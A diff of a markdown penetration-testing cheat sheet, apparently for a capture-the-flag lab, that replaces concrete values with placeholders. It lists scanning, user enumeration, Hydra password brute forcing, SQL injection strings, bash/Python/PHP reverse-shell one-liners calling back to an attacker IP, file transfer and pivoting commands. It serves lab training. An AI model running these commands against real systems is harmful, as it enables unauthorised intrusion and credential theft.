@@ -9,11 +9,11 @@
 ### Ping sweep
 
 ```bash
-fping -a -g 10.0.1.0/24 2>/dev/null
+fping -a -g <target-range> 2>/dev/null
 ```
 
 ```bash
-nmap -sn 10.0.1.0/24
+nmap -sn <target-range>
 ```
 
 ### ARP discovery
@@ -23,7 +23,7 @@ arp-scan -l
 ```
 
 ```bash
-netdiscover -r 10.0.1.0/24
+netdiscover -r <target-range>
 ```
 
 ---
@@ -127,7 +127,7 @@ smbmap -H <ip>
 ```
 
 ```bash
-smbmap -H <ip> -u <user> -p <password>
+smbmap -H <ip> -u <username> -p <password>
 ```
 
 ### RPC anonymous login
@@ -138,7 +138,7 @@ rpcclient -U "" -N <ip>
 
 Useful `rpcclient` commands:
 
-```bash
+```text
 enumdomusers
 enumdomgroups
 querydominfo
@@ -163,23 +163,23 @@ rpcclient -U "" -N <ip> -c "enumdomusers"
 ### SMTP user enumeration
 
 ```bash
-smtp-user-enum -M VRFY -U wordlist.txt -t <ip>
+smtp-user-enum -M VRFY -U <user-wordlist> -t <ip>
 ```
 
 ```bash
-smtp-user-enum -M EXPN -U wordlist.txt -t <ip>
+smtp-user-enum -M EXPN -U <user-wordlist> -t <ip>
 ```
 
 ### Kerberos user enumeration
 
 ```bash
-kerbrute userenum -d <domain> wordlist.txt --dc <dc-ip>
+kerbrute userenum -d <domain> <user-wordlist> --dc <dc-ip>
 ```
 
 ### Finger user enumeration
 
 ```bash
-finger <user>@<ip>
+finger <username>@<ip>
 ```
 
 ---
@@ -189,29 +189,29 @@ finger <user>@<ip>
 ### Hydra SSH
 
 ```bash
-hydra -L users.txt -P passwords.txt ssh://<ip>
+hydra -L <user-list> -P <password-list> ssh://<ip>
 ```
 
 ### Hydra FTP
 
 ```bash
-hydra -L users.txt -P passwords.txt ftp://<ip>
+hydra -L <user-list> -P <password-list> ftp://<ip>
 ```
 
 ### Hydra HTTP POST form
 
 ```bash
-hydra -L users.txt -P passwords.txt <ip> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
+hydra -L <user-list> -P <password-list> <ip> http-post-form "/<login-path>:<user-field>=^USER^&<pass-field>=^PASS^:<failure-message>"
 ```
 
 ### NetExec SMB password spray
 
 ```bash
-netexec smb <ip> -u users.txt -p passwords.txt
+netexec smb <ip> -u <user-list> -p <password-list>
 ```
 
 ```bash
-netexec smb <ip> -u <user> -p <password> --shares
+netexec smb <ip> -u <username> -p <password> --shares
 ```
 
 ---
@@ -231,19 +231,19 @@ curl -i http://<ip>:<port>
 ### Directory brute force with Gobuster
 
 ```bash
-gobuster dir -u http://<ip>:<port> -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://<ip>:<port> -w <wordlist>
 ```
 
 ### Directory brute force with FFUF
 
 ```bash
-ffuf -u http://<ip>:<port>/FUZZ -w /usr/share/wordlists/dirb/common.txt
+ffuf -u http://<ip>:<port>/FUZZ -w <wordlist>
 ```
 
 ### File extension fuzzing
 
 ```bash
-ffuf -u http://<ip>:<port>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html,.bak
+ffuf -u http://<ip>:<port>/FUZZ -w <wordlist> -e .php,.txt,.html,.bak
 ```
 
 ### Check common web vulnerabilities
@@ -275,21 +275,21 @@ curl -O http://<ip>:<port>/<file>
 ### Basic request inspection
 
 ```bash
-curl -i http://<ip>:<port>/login
+curl -i http://<ip>:<port>/<login-path>
 ```
 
 ### Send POST request
 
 ```bash
-curl -i -X POST http://<ip>:<port>/login \
-  -d "username=admin&password=admin"
+curl -i -X POST http://<ip>:<port>/<login-path> \
+  -d "<user-field>=<username>&<pass-field>=<password>"
 ```
 
 ### Include cookies
 
 ```bash
-curl -i http://<ip>:<port>/admin \
-  -H "Cookie: session=<value>"
+curl -i http://<ip>:<port>/<protected-path> \
+  -H "Cookie: <cookie-name>=<cookie-value>"
 ```
 
 ### SQL injection quick tests
@@ -298,18 +298,18 @@ curl -i http://<ip>:<port>/admin \
 '
 "
 ' OR '1'='1
-admin'--
+<username>'--
 ' OR 1=1--
 ```
 
 ### SQLMap basic usage
 
 ```bash
-sqlmap -u "http://<ip>:<port>/page?id=1"
+sqlmap -u "http://<ip>:<port>/<page>?<parameter>=<value>"
 ```
 
 ```bash
-sqlmap -u "http://<ip>:<port>/login" --forms --batch
+sqlmap -u "http://<ip>:<port>/<login-path>" --forms --batch
 ```
 
 ---
@@ -356,25 +356,25 @@ run
 ### Netcat listener
 
 ```bash
-nc -lvnp 4444
+nc -lvnp <listen-port>
 ```
 
 ### Bash reverse shell
 
 ```bash
-bash -i >& /dev/tcp/<your-ip>/4444 0>&1
+bash -i >& /dev/tcp/<your-ip>/<listen-port> 0>&1
 ```
 
 ### Python reverse shell
 
 ```bash
-python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<your-ip>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<your-ip>",<listen-port>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
 ```
 
 ### PHP reverse shell one-liner
 
 ```bash
-php -r '$sock=fsockopen("<your-ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("<your-ip>",<listen-port>);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 ---
@@ -414,25 +414,25 @@ stty rows 40 columns 120
 ### Find files by name
 
 ```bash
-find / -iname "*trophy*" 2>/dev/null
+find / -iname "*<keyword>*" 2>/dev/null
 ```
 
 ```bash
-find / -iname "*secret*" 2>/dev/null
+find / -iname "*<trophy-pattern>*" 2>/dev/null
 ```
 
 ```bash
-find / -iname "*zenicarna*" 2>/dev/null
+find / -iname "*<secret-pattern>*" 2>/dev/null
 ```
 
 ### Search for trophy values
 
 ```bash
-grep -R "trophy-" / 2>/dev/null
+grep -R "<trophy-prefix>" / 2>/dev/null
 ```
 
 ```bash
-grep -R "trophy-" /home 2>/dev/null
+grep -R "<trophy-prefix>" /home 2>/dev/null
 ```
 
 ### Search readable files
@@ -559,31 +559,31 @@ netstat -ano
 ### Search for files
 
 ```cmd
-dir C:\*trophy* /s /b
+dir C:\*<keyword>* /s /b
 ```
 
 ```cmd
-dir C:\*secret* /s /b
+dir C:\*<trophy-pattern>* /s /b
 ```
 
 ```cmd
-dir C:\*zenicarna* /s /b
+dir C:\*<secret-pattern>* /s /b
 ```
 
 ### Search inside files
 
 ```cmd
-findstr /si "trophy-" C:\*.txt
+findstr /si "<search-string>" C:\*.txt
 ```
 
 ### PowerShell file search
 
 ```powershell
-Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter "*trophy*"
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter "*<keyword>*"
 ```
 
 ```powershell
-Select-String -Path C:\* -Pattern "trophy-" -Recurse -ErrorAction SilentlyContinue
+Select-String -Path C:\* -Pattern "<search-string>" -Recurse -ErrorAction SilentlyContinue
 ```
 
 ---
@@ -593,29 +593,29 @@ Select-String -Path C:\* -Pattern "trophy-" -Recurse -ErrorAction SilentlyContin
 ### Python HTTP server on attacker machine
 
 ```bash
-python3 -m http.server 8000
+python3 -m http.server <port>
 ```
 
 ### Download using wget
 
 ```bash
-wget http://<your-ip>:8000/<file>
+wget http://<your-ip>:<port>/<file>
 ```
 
 ### Download using curl
 
 ```bash
-curl -O http://<your-ip>:8000/<file>
+curl -O http://<your-ip>:<port>/<file>
 ```
 
 ### Download with PowerShell
 
 ```powershell
-iwr http://<your-ip>:8000/<file> -OutFile <file>
+iwr http://<your-ip>:<port>/<file> -OutFile <file>
 ```
 
 ```powershell
-Invoke-WebRequest http://<your-ip>:8000/<file> -OutFile <file>
+Invoke-WebRequest http://<your-ip>:<port>/<file> -OutFile <file>
 ```
 
 ### Netcat file transfer
@@ -623,13 +623,13 @@ Invoke-WebRequest http://<your-ip>:8000/<file> -OutFile <file>
 On receiving machine:
 
 ```bash
-nc -lvnp 9001 > file.out
+nc -lvnp <port> > <output-file>
 ```
 
 On sending machine:
 
 ```bash
-nc <target-ip> 9001 < file.in
+nc <target-ip> <port> < <input-file>
 ```
 
 ---
@@ -649,29 +649,29 @@ route -n
 ### Add route to a network
 
 ```bash
-sudo ip route add 172.20.31.0/24 via 172.17.89.254
+sudo ip route add <destination-network>/<cidr> via <gateway-ip>
 ```
 
 ### Add route to a single host
 
 ```bash
-sudo ip route add 172.20.31.10 via 172.17.89.254
+sudo ip route add <destination-ip> via <gateway-ip>
 ```
 
 ### Delete route
 
 ```bash
-sudo ip route del 172.20.31.0/24
+sudo ip route del <destination-network>/<cidr>
 ```
 
 ### Test route
 
 ```bash
-ping 172.20.31.10
+ping <destination-ip>
 ```
 
 ```bash
-traceroute 172.20.31.10
+traceroute <destination-ip>
 ```
 
 ---
@@ -709,13 +709,13 @@ nmap -sV --script=banner -p <port> <ip>
 ### SSH local port forward
 
 ```bash
-ssh -L 8080:<target-ip>:80 <user>@<pivot-ip>
+ssh -L <local-port>:<target-ip>:<target-port> <username>@<pivot-ip>
 ```
 
 ### SSH dynamic SOCKS proxy
 
 ```bash
-ssh -D 1080 <user>@<pivot-ip>
+ssh -D <socks-port> <username>@<pivot-ip>
 ```
 
 ### Use proxychains
@@ -731,13 +731,13 @@ proxychains curl http://<target>
 ### Chisel server on attacker
 
 ```bash
-chisel server -p 8000 --reverse
+chisel server -p <port> --reverse
 ```
 
 ### Chisel client on target
 
 ```bash
-chisel client <your-ip>:8000 R:socks
+chisel client <your-ip>:<port> R:socks
 ```
 
 ---
@@ -747,47 +747,47 @@ chisel client <your-ip>:8000 R:socks
 ### Sort and remove duplicates
 
 ```bash
-sort wordlist.txt | uniq > sorted.txt
+sort <wordlist> | uniq > <output-file>
 ```
 
 ### Compare two files
 
 ```bash
-comm -12 <(sort file1.txt) <(sort file2.txt)
+comm -12 <(sort <file1>) <(sort <file2>)
 ```
 
-### Grep exact match
+### Grep exact matches between files
 
 ```bash
-grep -Fxf users.txt wordlist.txt
+grep -Fxf <file1> <file2>
 ```
 
 ### Count lines
 
 ```bash
-wc -l wordlist.txt
+wc -l <wordlist>
 ```
 
 ### Extract usernames from enum output
 
 ```bash
-grep -i "user" enum.txt
+grep -i "user" <enum-output-file>
 ```
 
 ---
 
 ## 20. Useful One-Liners
 
-### Find trophy files
+### Find likely trophy or secret files
 
 ```bash
-find / -iname "*trophy*" -o -iname "*secret*" 2>/dev/null
+find / -iname "*<trophy-pattern>*" -o -iname "*<secret-pattern>*" 2>/dev/null
 ```
 
 ### Find trophy text
 
 ```bash
-grep -R "trophy-" / 2>/dev/null
+grep -R "<trophy-prefix>" / 2>/dev/null
 ```
 
 ### Scan then enumerate SMB
@@ -799,7 +799,7 @@ nmap -p 139,445 -sV -sC <ip> && enum4linux-ng <ip>
 ### Quick web enum
 
 ```bash
-whatweb http://<ip>:<port> && gobuster dir -u http://<ip>:<port> -w /usr/share/wordlists/dirb/common.txt
+whatweb http://<ip>:<port> && gobuster dir -u http://<ip>:<port> -w <wordlist>
 ```
 
 ### Quick service check
@@ -811,34 +811,34 @@ nc -nv <ip> <port>
 ### Start listener
 
 ```bash
-nc -lvnp 4444
+nc -lvnp <listen-port>
 ```
 
 ---
 
 ## 21. Common Wordlists
 
-```bash
+```text
 /usr/share/wordlists/dirb/common.txt
 ```
 
-```bash
+```text
 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-```bash
+```text
 /usr/share/seclists/Discovery/Web-Content/common.txt
 ```
 
-```bash
+```text
 /usr/share/seclists/Usernames/top-usernames-shortlist.txt
 ```
 
-```bash
+```text
 /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
 ```
 
-```bash
+```text
 /usr/share/wordlists/rockyou.txt.gz
 ```
 
@@ -855,7 +855,7 @@ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
 ### 1. Discover
 
 ```bash
-nmap -sn <range>
+nmap -sn <target-range>
 ```
 
 ### 2. Scan
@@ -887,8 +887,8 @@ or use a manual exploit.
 ### 6. Search for trophy
 
 ```bash
-find / -iname "*trophy*" -o -iname "*secret*" 2>/dev/null
-grep -R "trophy-" / 2>/dev/null
+find / -iname "*<trophy-pattern>*" -o -iname "*<secret-pattern>*" 2>/dev/null
+grep -R "<trophy-prefix>" / 2>/dev/null
 ```
 
 ---
@@ -915,14 +915,43 @@ Suggested folder layout:
 mkdir -p ~/crt-lab/<target>/{scans,loot,exploits,notes}
 ```
 
-Example:
-
-```bash
-mkdir -p ~/crt-lab/10.0.1.27/{scans,loot,exploits,notes}
-```
-
 Save scans:
 
 ```bash
 nmap -sV -sC -oN scans/basic.txt <target>
 ```
+
+---
+
+## 24. Placeholder Reference
+
+| Placeholder                    | Meaning                                          |
+| ------------------------------ | ------------------------------------------------ |
+| `<target>`                     | IP address, hostname, or range                   |
+| `<ip>`                         | Single target IP address                         |
+| `<target-range>`               | Network range, for example `<subnet>/<cidr>`     |
+| `<host>`                       | Hostname                                         |
+| `<domain>`                     | DNS, Windows, or Kerberos domain                 |
+| `<username>`                   | Single username                                  |
+| `<password>`                   | Single password                                  |
+| `<user-list>`                  | File containing usernames                        |
+| `<password-list>`              | File containing passwords                        |
+| `<wordlist>`                   | Generic wordlist                                 |
+| `<port>`                       | TCP or UDP port                                  |
+| `<ports>`                      | Comma-separated port list                        |
+| `<gateway-ip>`                 | Router or pivot gateway                          |
+| `<destination-ip>`             | Target behind a route                            |
+| `<destination-network>/<cidr>` | Destination subnet, for example `10.10.10.0/24`  |
+| `<keyword>`                    | File, service, or challenge-specific search term |
+| `<trophy-pattern>`             | Filename pattern for trophy files                |
+| `<secret-pattern>`             | Filename pattern for secret files                |
+| `<trophy-prefix>`              | Known text prefix for trophy values              |
+| `<search-string>`              | Text to search for inside files                  |
+| `<your-ip>`                    | Your attacker/VPN IP address                     |
+| `<listen-port>`                | Port used by your listener                       |
+| `<pivot-ip>`                   | Compromised host used as a route or proxy        |
+| `<login-path>`                 | Web login endpoint                               |
+| `<protected-path>`             | Authenticated web path                           |
+| `<user-field>`                 | Login form username parameter                    |
+| `<pass-field>`                 | Login form password parameter                    |
+| `<failure-message>`            | Text shown when login fails                      |
